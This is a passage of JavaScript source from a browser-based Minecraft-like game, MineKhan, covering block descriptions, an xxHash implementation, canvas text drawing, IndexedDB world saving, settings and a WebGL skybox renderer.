		{blocks:["powderSnow"],data:"Snow that is new."},
		{blocks:["cobblestone"],data:"Many round rocks."},
		{blocks:["quartzBlock","netherQuartz"],data:"Made of oxygen and silicon in a tetrahedron (three sided pyramids). Also a piezoelectric crystal."},
		{blocks:["basalt","polishedBasalt","smoothBasalt"],data:"Igenous rock formed by rapid cooling of low-viscosity lava. Rich in magnesium and iron."},
		{blocks:["tuff"],data:"Volcanic ash lithified into a solid rock. Contains greater than 75% ash."},
		{blocks:["is:sign"],data:"Can have text on both sides, can be dyed with dye."},
		{blocks:["is:bed"],data:"Can be slept in."},
		{blocks:["pointedDripstone","dripstoneBlock"],data:"Grows when liquid is above."},
		{blocks:["poweredRail"],data:"Speeds up or slows down minecarts."}
	]
  
	// implementation of xxHash
	const {
		seedHash,
		hash, hash3, hash5
	} = (() => {
		// closure around mutable `seed`; updated via calls to `seedHash`

		let seed = Math.random() * 2100000000 | 0;

		const PRIME32_2 = 1883677709;
		const PRIME32_3 = 2034071983;
		const PRIME32_4 = 668265263;
		const PRIME32_5 = 374761393;

		const seedHash = s => {
			seed = s | 0;
		}

		const { imul } = Math;

		const hash = (x, y) => {
			let h32 = 0;

			h32 = seed + PRIME32_5 | 0;
			h32 += 8;

			h32 += imul(x, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(y, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);

			h32 ^= h32 >> 15;
			h32 *= PRIME32_2;
			h32 ^= h32 >> 13;
			h32 *= PRIME32_3;
			h32 ^= h32 >> 16;

			return h32 / 2147483647;
		};
		const hash3 = (x, y, z) => {
			let h32 = 0;

			h32 = seed + PRIME32_5 | 0;
			h32 += 8;

			h32 += imul(x, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(y, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(z, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);

			h32 ^= h32 >> 15;
			h32 *= PRIME32_2;
			h32 ^= h32 >> 13;
			h32 *= PRIME32_3;
			h32 ^= h32 >> 16;

			return h32 / 2147483647;
		};
		const hash5 = (x, y, z, x2, y2) => {
			let h32 = 0;

			h32 = seed + PRIME32_5 | 0;
			h32 += 8;

			h32 += imul(x, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(y, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(z, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(x2, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);
			h32 += imul(y2, PRIME32_3);
			h32 = imul(h32 << 17 | h32 >> 32 - 17, PRIME32_4);

			h32 ^= h32 >> 15;
			h32 *= PRIME32_2;
			h32 ^= h32 >> 13;
			h32 *= PRIME32_3;
			h32 ^= h32 >> 16;

			return h32 / 2147483647;
		};

		return {
			seedHash,
			hash, hash3, hash5
		};
	})();

	const win = window
	const doc = document
	const { console } = win
	let world, serverWorld
  
  //copied from https://gist.github.com/bzdgn/d722c961f45d97ea8efc6cef3aa39e76
  function nodeRotationX(node, theta) {
		var cosTheta = Math.cos(theta);
		var sinTheta = Math.sin(theta);
		
		var y = node.y;
		var z = node.z;
		
		node.y = y * cosTheta - z * sinTheta;
		node.z = y * sinTheta + z * cosTheta;
	}
  function nodeRotationY(node, theta) {
		var cosTheta = Math.cos(theta);
		var sinTheta = Math.sin(theta);
		
		var x = node.x;
		var z = node.z;
		
		node.x = x * cosTheta - z * sinTheta;
		node.z = x * sinTheta + z * cosTheta;
	}
  var node = {x:0, y:0, z:0}
  function getRotation(rotX, rotY){
    //node.x = -sin(rotY) * cos(rotX)
    //node.y = sin(rotX)
    //node.z = cos(rotY) * cos(rotX)
    node.x = 0;node.y=0;node.z=1
    nodeRotationX(node,rotX+Math.PI)
    node.z = -node.z
    nodeRotationY(node,rotY)
    
    return node
  }
  win.getRotation = getRotation

	const {PVector} = win
  
	let fill = function(r, g, b, a) {
		if (g === undefined) {
			g = r
			b = r
		}
    a = a || a === 0 ? a : 100
		ctx.fillStyle = "rgb(" + r + ", " + g + ", " + b + ", "+a+"%)"
	}
	let stroke = function(r, g, b) {
		if (g === undefined) {
			g = r
			b = r
		}
		ctx.strokeStyle = "rgb(" + r + ", " + g + ", " + b + ")"
	}
	let line = function(x1, y1, x2, y2) {
		ctx.moveTo(x1, y1)
		ctx.lineTo(x2, y2)
	}
  let ellipse = function(x,y,w,h,fill,stroke){
		if(ctx.ellipse){
			ctx.beginPath();
			ctx.ellipse(x,y,w,h,0, 0,Math.PI*2)
			if(fill) ctx.fill()
			if(stroke) ctx.stroke()
		}
	}
	function blockNameText(txt){
		let full = txt.startsWith("block.")
		let block = blockData[txt.replace(/(block|blockName)\./,'')]
		if(customResources.texts["block."+block.name]) txt = customResources.texts["block."+block.name]
		else if(block) txt = block.Name
		if(typeof txt === "function") txt = txt()
		if(full){
			if(block.rarity){
				if(block.rarity === "uncommon") txt += "\neUncommon"
				if(block.rarity === "rare") txt += "\nbRare"
				if(block.rarity === "epic") txt += "\ndEpic"
			}
			if(block.category) txt += "\n9"+blockCategories[block.category]
			//if(block.type) txt += "\nc"+blockCategories[block.type]
			if(blockInfoIds[block.id]){
				txt += "\nr"+blockInfo[blockInfoIds[block.id]].data
			}
			if(block.name !== block.Name) txt += "\n7"+block.name
		}
		return txt
	}
	//let asdf=/[a-zA-Z]/g, asdfg = txt => txt.replace(asdf,"*")
	//hoverbox types: 1: block name, 2: block name over inventory, 3: debug info bottom aligned, 4: debug info
	let textLineSizes = [], textLineSplits = []
	function text(txt, x, y, h, hoverbox) {
		txt += ""
		h = h || 0
		let prevFillStyle = ctx.fillStyle
		if(customResources.texts[txt]) txt = customResources.texts[txt]
		else if(txt.startsWith("block.") || txt.startsWith("blockName.")) txt = blockNameText(txt)
		else if(txt.startsWith("slider:"))sliderLoop:{
			txt = txt.replace("slider:","")
			let i = txt.indexOf(",")
			if(i === -1) break sliderLoop
			let n = txt.substring(0,i)
			txt = txt.substring(i+1,txt.length)
			if(customResources && customResources.texts[txt]) txt = customResources.texts[txt]
			txt += ": "+n
		}
    if(userInfo ? userInfo.profanityFilter : true) for(var obj of Messages.remove){ //remove bad words
      txt = txt.replace(obj.replace, obj.with)
    } //if you change this, change the one in Messages.format and TextDisplay

		let baseline = ctx.textBaseline
		if(!txt.includes("\n") && !txt.includes("") && !hoverbox){
			ctx.textBaseline = "top"
			ctx.fillText(txt, x, y)
			ctx.textBaseline = baseline
			return
		}

		let lines = txt.split("\n")
		let fillStyle = ctx.fillStyle
		let fontBeforeMeasure = ctx.font
		ctx.textBaseline = "top"
		if(hoverbox && hoverbox !== 4) y -= (lines.length)*h
		for (let i = 0; i < lines.length; i++) {
      let px = x
			let codes = textLineSplits[i] = lines[i].split("")
      let tw = ctx.measureText(codes[0]).width
			for(let j=1; j<codes.length; j++){
				let code = codes[j][0]
				if(code === "l"){
					if(!ctx.font.includes("bold")) ctx.font = "bold "+ctx.font
				}else if(code === "o"){
					if(!ctx.font.includes("italic")) ctx.font = "italic "+ctx.font
				}else if(code === "r"){
					ctx.font = ctx.font.replace("bold","")
					ctx.font = ctx.font.replace("italic","")
				}
				tw += ctx.measureText(codes[j].substring(1)).width
			}
      let m2 = tw / 2
      switch(ctx.textAlign){
        case "right":
          x -= tw
          if(hoverbox === 1) x -= 10
          break
        case "center":
          x -= m2
          break
        default:
          if(hoverbox === 1) x += 10
          break
      }
			textLineSizes[i] = x
      if(hoverbox){
        if(hoverbox === 2) ctx.fillStyle = "black", ctx.fillRect(x-10,y-10+h*i,tw+20,h+20)
        else if(hoverbox === 1) ctx.fillStyle = "black", ctx.fillRect(x-10, y+h*i, tw+20, h);
				else if(hoverbox === 3 || hoverbox === 4) ctx.fillStyle = "#0008", ctx.fillRect(x,y+h*i,tw,h)
        ctx.fillStyle = fillStyle
      }
      x = px
		}
		ctx.font = fontBeforeMeasure
		let textAlign = ctx.textAlign
		for (let i = 0; i < lines.length; i++) {
      ctx.textAlign = "left"
      let px = x
      x = textLineSizes[i]
      if(lines[i].includes("")){
        let codes = textLineSplits[i]
        ctx.fillText(codes[0], x, y + h * i)
        x += ctx.measureText(codes[0]).width
        for(var j=1; j<codes.length; j++){
          let str = codes[j], code = str[0]
          if(code === "l"){
						if(!ctx.font.includes("bold")) ctx.font = "bold "+ctx.font
					}else if(code === "o"){
						if(!ctx.font.includes("italic")) ctx.font = "italic "+ctx.font
					}else if(code === "r"){
						ctx.font = ctx.font.replace("bold","")
						ctx.font = ctx.font.replace("italic","")
						ctx.fillStyle = fillStyle
					}else ctx.fillStyle = colors.css[code]
          str = str.substring(1)
          ctx.fillText(str, x, y+h*i)
          x += ctx.measureText(str).width
        }
      }else ctx.fillText(lines[i], x, y + h * i)
      //ctx.fillStyle = fillStyle
      x = px
		}
		ctx.textAlign = textAlign
    ctx.textBaseline = baseline
		ctx.fillStyle = prevFillStyle
	}
  /*ctx.textAlign = "left"
    ctx.font = "16px thefont";
    var w = ctx.measureText(name).width;
    fill(0)
    ctx.fillRect(mouseX, mouseY, w+20, 20);

    fill(255);
    text(name, mouseX+10, mouseY+13+2);
  */
	function textSize(size) {
		ctx.font = size + 'px thefont' // thefont
	}
	let strokeWeight = function(num) {
		ctx.lineWidth = num
	}
  function map(v, min, max, min2, max2){
    return min2 + (max2 - min2) * ((v - min) / (max - min));
  }
  function lerp(t, a, b) {
    return a + t * (b - a);
  }
  function dist2(x,y,x2,y2){
    let xDist = x - x2
    let yDist = y - y2
    return sqrt((xDist*xDist)+(yDist*yDist))
  }
  function dist3(x,y,z,x2,y2,z2){
    let xDist = x - x2
    let yDist = y - y2
    let zDist = z - z2
    return sqrt((xDist*xDist)+(yDist*yDist)+(zDist*zDist))
  }
  win.dist2 = dist2; win.dist3 = dist3
  function mag(x,y,z) {
    return sqrt(x * x + y * y + z * z)
  }
  win.mag = mag
  
	const ARROW = "arrow"
	const HAND = "pointer"
	let cursor = function(type) {
		document.body.style.cursor = type
	}

	async function createDatabase() {
		return await new Promise(async (resolve, reject) => {
			let request = window.indexedDB.open("MineKhan", 2)

			request.onupgradeneeded = function(event) {
				let DB = event.target.result
				// Worlds will contain and ID containing the timestamp at which the world was created, a "saved" timestamp,
				// and a "data" string that's identical to the copy/paste save string
				if(!DB.objectStoreNames.contains("worlds")){
					let store = DB.createObjectStore("worlds", { keyPath: "id" })
					store.createIndex("id", "id", { unique: true })
					store.createIndex("data", "data", { unique: false })
				}
				let store = DB.createObjectStore("resourcePacks", { keyPath: "id" })
				store.createIndex("id", "id", { unique: true })
				store.createIndex("data", "data", { unique: false })
			}

			request.onsuccess = function(e) {
				resolve(request.result)
			}

			request.onerror = function(e) {
				reject(request.error || new Error("indexed db open error"))
			}
		})
	}
	async function loadFromDB(id, storeName = "worlds") {
		return await new Promise(async (resolve, reject) => {
			let db = await createDatabase()
			let trans = db.transaction(storeName, "readwrite")
			let store = trans.objectStore(storeName)
			let req = id ? store.get(id) : store.getAll()
			req.onsuccess = function(e) {
				resolve(req.result)
				db.close()
			}
			req.onerror = function(e) { 
				resolve(null)
				db.close()
			}
		})
	}
	async function saveToDB(id, data, storeName = "worlds") {
		return new Promise(async (resolve, reject) => {
			let db = await createDatabase()
			let trans = db.transaction(storeName, "readwrite")
			let store = trans.objectStore(storeName)
			let req = store.put({ id: id, data: data })
			req.onsuccess = function() {
				resolve(req.result)
			}
			req.onerror = function(e) {
				reject(req.error)
			}
		})
	}
	async function deleteFromDB(id, storeName = "worlds") {
		return new Promise(async (resolve, reject) => {
			let db = await createDatabase()
			let trans = db.transaction(storeName, "readwrite")
			let store = trans.objectStore(storeName)
			let req = store.delete(id)
			req.onsuccess = function() {
				resolve(req.result)
			}
			req.onerror = function(e) {
				reject(req.error)
			}
		})
	}

	async function save(getObj) {
    let obj = {
			id: serverWorld.id,
			edited: Date.now(),
			name: serverWorld.name,
			version: version, //old saves don't work if you change version number
			code: serverWorld.getSaveString(),
      mod: serverWorld.mod,
      thumbnail: genWorldImage(),
      playersInv: serverWorld.getPlayersInv(),
      banned, whitelist,
			activeResourcePacks:serverWorld.activeResourcePacks
		}
		if(!getObj) await saveToDB(serverWorld.id, obj)
		obj.code += ""
		let playersInvString = {}
		for(let i in serverWorld.playersInv){
			playersInvString[i] = {}
			if(serverWorld.playersInv[i].inv) playersInvString[i].inv = serverWorld.playersInv[i].inv.toString()
			if(serverWorld.playersInv[i].survivStr) playersInvString[i].survivStr = serverWorld.playersInv[i].survivStr.toString()
		}
		obj.playersInv = playersInvString
		if(!getObj){
			await fetch('saves', {
				method: "POST",
				headers:{Authorization:userSessionString},
				body: JSON.stringify(obj)
			}).then(r => r.json()).then(r => {
				if(!r.success){
					console.log(r.message)
				}
			}).catch(console.error)
			serverWorld.edited = Date.now()
    }else{
      return obj
    }
	}
  win.save = save
  
  async function getSaveJSON(){
    let obj = await save(true)
    delete obj.thumbnail
    delete obj.banned
    delete obj.whitelist
    return JSON.stringify(obj)
  }
  
  let sixtyfourCnv = document.createElement("canvas")
	sixtyfourCnv.width = sixtyfourCnv.height = 64
  let sixtyfourCtx = sixtyfourCnv.getContext("2d")
  function genWorldImage(){
    let midx = gl.canvas.width / 2, midy = gl.canvas.height / 2
    let size = min(gl.canvas.width, gl.canvas.height), s2 = size / 2
    sixtyfourCtx.drawImage(gl.canvas, midx - s2, midy - s2, size,size, 0,0,64,64)
    return sixtyfourCnv.toDataURL("image/png")
  }
	win.genWorldImage = genWorldImage

	// Expose these functions to the global scope for debugging
	win.saveToDB = saveToDB
	win.loadFromDB = loadFromDB
	win.createDatabase = createDatabase
	win.deleteFromDB = deleteFromDB

	//globals
	//{
	const {version} = win
  doc.title = "MineKhan-thingmaker "+version
  let defaultThirdPersonReach = 4, thirdPersonReach = defaultThirdPersonReach
  let defaultSkySolid = [0,0,0], defaultSky = [...defaultSkySolid] //actual default: 0.6, 0.8, 0.9
	let sky = [...defaultSky]/*[0.33, 0.54, 0.72, (originl sky)]*/ // 0 to 1 RGB color scale
	let defaultSkyBottom = [171/255, 210/255, 255/255]
	let skyOrange = [1,0.5,0]
  let skyBottom = [...defaultSky]
	let worldType = "alpha"
	let trees = true
	let caves = true
	let fancyRivers = false
	let structures = false
  let cheats = true
  let dieMessage = ""
  let inWorld = false
	let skipWaitingLoading = false
	let loadJoined
  function updateTitle(inWorld2 = inWorld){
    inWorld = inWorld2
		if(!doc.title.includes("MineKhan")) return
    doc.title = (Messages.unreadCount ? "("+Messages.unreadCount+") " : "")+(inWorld ? world.name+" | " : "")+"MineKhan-thingmaker "+version
  }
  
  win.eachFrame = null, win.eachTick = null
	let lastBlur = 0
  
  const currentAmbient = {} //Object with ambient sound sources
  const currentAmbientPanner = {}
  win.currentAmbient = currentAmbient, win.currentAmbientPanner = currentAmbientPanner

	let currentFov

	// Configurable and savable settings
	let defaultSettings = {
		renderDistance: 4,
		fov: 70, // Field of view in degrees
		mouseSense: 100, // Mouse sensitivity as a percentage of the default
    volume: 1, //volume for all the sounds
    narrator: false, //read chat & stuff
    narratorPitch: 1,
    narratorRate: 1,
    narratorVoice: null, // defined later
		joystick: true,
		language: null,
		adjustBrightness: false,
		reach: 5, // Max distance player can place or break blocks
		graphics: null, //Null means not changed yet (same as normal)
		resolution: true,
		simulationDistance: 1
	}
	let settings = Object.assign({}, defaultSettings)
  win.settings = settings
	function compareObject(original,obj){
		let ret = {}
		for(let i in original){
			if(original[i] !== obj[i]) ret[i] = obj[i]
		}
		return ret
	}
  // Some settings for the world
  let {defaultWorldSettings} = win
	let worldSettingKeys = Object.keys(defaultWorldSettings)
  let worldSettings = Object.assign({}, defaultWorldSettings)
  win.worldSettings = worldSettings
	let mouseX, mouseY, mouseDown
	let width = window.innerWidth
	let height = window.innerHeight
	let resolution = settings.resolution === "max" ? devicePixelRatio : (settings.resolution === "low" ? 0.125 : 1)
	let resWidth = width*resolution
	let resHeight = height*resolution //resolution of display
	canvas.height = canvas2.height = resHeight
	canvas.width = canvas2.width = resWidth
	ctx.scale(resolution,resolution)
	let performFast = false
	function updatePerformFast(){
		const fast = settings.graphics === "fast"
		if(fast !== performFast){
			performFast = fast
			if(inWorld) world.redoMeshes()
		}
	}
  
	let weather = "", prevWeather = "", prevActualWeather = weather, weatherAmount = 0, prevWeatherAmount = 0, slowWeatherAmount = 0
	let nextWeather = 10000
	let weatherDist = 24, weatherRenderDist = 8
  class Skybox{
    constructor(){
      const shape = shapes.cube
      const shapeVerts = shape.verts
			const size = shape.size
      
      this.vao = glExtensions.vertex_array_object.createVertexArrayOES()
      this.verticesBuffer = gl.createBuffer()
      glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
      gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

      gl.bindBuffer(gl.ARRAY_BUFFER, this.verticesBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.skyboxVertex, 3, gl.FLOAT, false, 0, 0)

      gl.enableVertexAttribArray(glCache.skyboxVertex)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      this.faces = size
      
      let tex = textureCoords[textureMap.sun] || [0,0,0,0]
      this.sun = generateVAO(shapes.sun, tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
      
      this.moonPhase = null
      this.moon = null
    }
		moonLight = [4,3,2,1,0.5,1,2,3]
		stretchHeight = 1/sqrt(2)
		getMoonPhase(){
			return round(worldTime/1000) % 8
		}
    render() {
      gl.depthFunc(gl.ALWAYS);
      gl.disable(gl.CULL_FACE);
      gl.useProgram(skyboxProgram);
      gl.uniform1f(glCache.skyboxLight, fogBrightness);
      gl.uniform3f(glCache.skyboxSky, sky[0], sky[1], sky[2])
      gl.uniform3f(glCache.skyboxSkyBottom, skyBottom[0],skyBottom[1],skyBottom[2]);
			gl.uniform1f(glCache.skyboxTime, worldTime/1000);
      gl.uniform1f(glCache.skyboxBrightness, brightness)
      gl.uniformMatrix4fv(glCache.skyboxView, false, p.camera.matrix)
      
      glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
      gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      
      let moonPhase = round(worldTime/1000) % 8
      if(this.moonPhase !== moonPhase){
        this.moonPhase = moonPhase
        let tex = textureCoords[textureMap["moonPhases"+moonPhase]] || [0,0,0,0]
        this.moon = generateVAO(shapes.sun, tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
      }
      
      gl.blendFunc(gl.ONE,gl.ONE)
      gl.useProgram(programEntity)
      let rotation = ((worldTime%1000)*Math.PI/500)+Math.PI
      let diff = (now - p.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let px = (p.x - p.previousX) * diff + p.previousX
			let py = (p.y - p.previousY) * diff + p.previousY
			let pz = (p.z - p.previousZ) * diff + p.previousZ
      gl.useProgram(programEntity)
			const {sunDir} = world
      this.renderObject(this.sun.vao,px+sunDir.x*1000, py+sunDir.y*1000, pz+sunDir.z*1000, -rotation+Math.PI2, this.sun.size)
      if(skyLight !== 1) this.renderObject(this.moon.vao,px-sunDir.x*1000, py-sunDir.y*1000, pz-sunDir.z*1000, -rotation+Math.PI+Math.PI2, this.moon.size, 1-skyLight)
      
      gl.depthFunc(gl.LESS)
      gl.enable(gl.CULL_FACE)
      gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA)
    }
    renderObject(vao,x,y,z,rz,size,bright = 1){
      const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(x, y, z)
			modelMatrix.rotY(-Math.PI*0.125)
      modelMatrix.rotZ(rz)
      modelMatrix.rotY(Math.PI2)
      modelMatrix.scale(500,500,500)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, 1)
			gl.uniform1f(glCache.uSkylightEntity, 1)
      gl.uniform1f(glCache.harmEffectEntity, 0)
      gl.uniform3f(glCache.tintEntity, bright,bright,bright)
			gl.uniform3f(glCache.uPosEntity, 0,0,0)
    	gl.uniform1i(glCache.useNormalsEntity, 0)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
      glExtensions.vertex_array_object.bindVertexArrayOES(vao)
      gl.drawElements(gl.TRIANGLES, 6 * size, gl.UNSIGNED_INT, 0)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      gl.uniform3f(glCache.tintEntity, 1,1,1)
    	gl.uniform1i(glCache.useNormalsEntity, 1)
    }
  }
  let skybox
  
  let {colors} = win

	if (height === 400) alert("Canvas is too small. Click the \"Settings\" button to the left of the \"Vote Up\" button under the editor and change the height to 600.")
	//if(!confirm("The original is by Willard which can be found here: https://willard.fun/minekhan\nThis version of MineKhan may disappear any time due to many problems.")) location.href="https://willard.fun/minekhan"

	const maxHeight = 319
	const minHeight = -64
	const minEntityY = minHeight-40
	const weatherHeight = 192
  const netherHeight = 127
	let blockOutlines = false
	let blockFill = true
	let updateHUD = true
  
  let images = {
    attackIndicatorCrosshair: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAHBAMAAAC8U9OhAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAKlBMVEUAAAD///86OzzS0tbX2erq7PI6OzxbSkmCbWxtWVfX2er////q7PL///+PAAbaAAAABnRSTlMAAAAAAABupgeRAAAAAWJLR0QN9rRh9QAAAAd0SU1FB+UICBISCBYUzEAAAAABb3JOVAHPoneaAAAASklEQVQI12NgYGOAAHYwyQilGRjSoKCzcxUYQOnVMAmFzs4zu4HABEobMKAZxeIAMwoNMAoKigouAWIsEoJRqxwFA7HpCFkClAAAVfMfb4rLipMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjEtMDgtMDhUMTg6MTc6MTgrMDA6MDB6HTijAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIxLTA4LTA4VDE4OjE3OjE4KzAwOjAwC0CAHwAAAABJRU5ErkJggg==",
    cold:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAAXNSR0IArs4c6QAAAHxJREFUKFNjZEAD/S/+7y+UYHREFmaEcUCSILYlDwPD8S8QUZhixuwHEEkVDlQFILGrj1+CFTN63oAoUuKA6AYphkm+fPsBociYn4Hh7EeIoj9v3jBwfHmL4lK4STBR8hXBTIC5DdmkzR4a4KCABwFMseuR1/t324iihBMAZ9FAUIfw/h8AAAAASUVORK5CYII=",
    hot:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAAXNSR0IArs4c6QAAAGxJREFUKFOFkDsKgDAQRN+C19NCsPCEKQQLvZ4QmTXRxCBus595GYYYPxV7omXGlx3fm/lLLGF7QxLlqHueK3sXZiCAd1XgyeAHCROwpD5erlXwG9IDgXJpoBXoIhwGycVzld/kmbYIg7lD1k5Fkzjr1as+mQAAAABJRU5ErkJggg==",
    experienceBar:[
      "data:image/png;base64,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"
      //splitting it because it is too long
    ].join(""),
    freezeEffect: "assets/images/freeze_effect.png",
    spyglassScope:"assets/images/spyglass_scope.png",
